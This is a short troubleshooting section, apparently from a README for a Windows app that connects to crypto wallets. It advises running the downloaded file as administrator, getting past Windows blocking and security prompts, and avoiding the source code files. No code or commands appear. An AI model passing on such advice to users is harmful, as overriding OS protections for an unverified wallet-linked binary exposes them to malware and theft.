## 🧰 Troubleshooting

### The app does not open

- Right-click the file and choose Run as administrator
- Make sure you extracted the ZIP file first
- Check whether Windows blocked the file
- Try downloading the file again from the release page

### Windows shows a security prompt

- Click More info if needed
- Confirm you want to run the app
- Make sure the file came from the GitHub release page

### The app opens, but I see a blank screen

- Close the app and open it again
- Check your internet connection
- Make sure the correct network or wallet is connected
- If needed, restart your PC

### My wallet will not connect

- Confirm the wallet app is installed
- Make sure you selected the right chain
- Check that pop-ups are not blocked
- Try disconnecting and reconnecting the wallet

### I downloaded the wrong file

- Go back to the release page
- Choose the Windows file
- Avoid source code files unless you know you need them
